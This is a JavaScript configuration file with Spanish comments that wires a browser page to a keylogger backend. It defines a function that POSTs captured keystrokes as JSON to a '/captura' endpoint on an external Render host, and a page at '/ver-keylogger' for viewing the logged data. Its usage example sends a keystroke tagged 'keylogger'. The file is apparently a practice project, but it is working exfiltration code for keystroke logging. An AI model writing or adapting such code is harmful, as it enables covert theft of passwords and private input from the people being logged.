// ============================================
// CONFIGURACIÓN DE URLs PARA EL FRONTEND
// ============================================
// Este archivo centraliza las URLs del backend para facilitar su uso desde el frontend

// Objeto CONFIG: Contiene toda la configuración de URLs
const CONFIG = {
  // URL base del backend desplegado en Render
  BACKEND_URL: 'https://backend-prueba-o523.onrender.com',
  
  // Objeto ENDPOINTS: Rutas específicas de cada endpoint
  ENDPOINTS: {
    CAPTURA: '/captura',        // Ruta para enviar datos al servidor
    VER_DATOS: '/ver-keylogger' // Ruta para visualizar datos capturados
  },
  
  // Función helper para construir la URL completa de un endpoint
  // Uso: CONFIG.getEndpointUrl(CONFIG.ENDPOINTS.CAPTURA)
  // Resultado: 'https://backend-prueba-o523.onrender.com/captura'
  getEndpointUrl: function(endpoint) {
    return this.BACKEND_URL + endpoint;
  }
};

// ============================================
// FUNCIÓN: enviarDatos
// ============================================
// Propósito: Enviar datos al backend usando la API Fetch
// Parámetro: data (objeto JavaScript con los datos a enviar)
// Retorna: Promesa con la respuesta del servidor o undefined si hay error
async function enviarDatos(data) {
  try {
    // Hacer petición POST al endpoint /captura
    const response = await fetch(CONFIG.getEndpointUrl(CONFIG.ENDPOINTS.CAPTURA), {
      method: 'POST',                          // Método HTTP
      headers: {
        'Content-Type': 'application/json'     // Indicar que enviamos JSON
      },
      body: JSON.stringify(data)               // Convertir objeto a JSON string
    });
    
    // Verificar si la respuesta fue exitosa (status 200-299)
    if (response.ok) {
      const result = await response.json();    // Parsear la respuesta JSON
      console.log('✅ Datos enviados correctamente:', result);
      return result;                           // Retornar el resultado
    } else {
      console.error('❌ Error al enviar datos:', response.status);
    }
  } catch (error) {
    // Capturar errores de red o problemas de conexión
    console.error('❌ Error de conexión:', error);
  }
}

// ============================================
// FUNCIÓN: verDatosCapturados
// ============================================
// Propósito: Abrir la página de datos capturados en una nueva ventana
// Sin parámetros
// Abre: https://backend-prueba-o523.onrender.com/ver-keylogger
function verDatosCapturados() {
  window.open(CONFIG.getEndpointUrl(CONFIG.ENDPOINTS.VER_DATOS), '_blank');
}

// ============================================
// EXPORTAR AL SCOPE GLOBAL
// ============================================
// Hacer que estas variables y funciones estén disponibles globalmente
// para que puedan ser usadas desde cualquier script en el HTML
window.CONFIG = CONFIG;
window.enviarDatos = enviarDatos;
window.verDatosCapturados = verDatosCapturados;

// ============================================
// EJEMPLO DE USO EN TU HTML
// ============================================
// Incluir este archivo en tu HTML:
//   <script src="config.js"></script>
//
// Luego puedes usar:
//   enviarDatos({ key: 'a', type: 'keylogger' });
//   verDatosCapturados();
//   console.log(CONFIG.BACKEND_URL);